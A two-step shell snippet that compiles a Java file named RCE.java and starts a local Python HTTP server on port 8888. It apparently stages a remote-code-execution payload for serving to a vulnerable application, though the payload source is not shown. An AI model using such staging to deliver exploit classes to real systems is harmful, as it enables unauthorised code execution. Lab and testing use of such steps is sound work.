# compile code
/usr/lib/jvm/java-8-openjdk-amd64/bin/javac RCE.java

# Start http server
python3 -m http.server --bind 127.0.0.1 8888
